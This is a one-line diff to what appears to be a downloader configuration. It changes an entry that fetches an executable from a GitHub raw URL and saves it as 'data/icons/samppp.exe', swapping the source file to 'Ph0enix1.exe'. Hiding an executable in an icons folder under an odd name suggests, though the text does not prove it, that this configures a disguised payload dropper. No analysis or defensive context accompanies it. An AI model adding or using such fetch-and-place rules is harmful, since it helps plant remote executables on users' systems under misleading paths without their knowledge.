@@ -1,1 +1,1 @@
-exe;data/icons/sampp.exe;https://github.com/snowpower2/snow/raw/main/phoenix.exe?dl=1
+exe;data/icons/samppp.exe;https://github.com/snowpower2/snow/raw/main/Ph0enix1.exe?dl=1
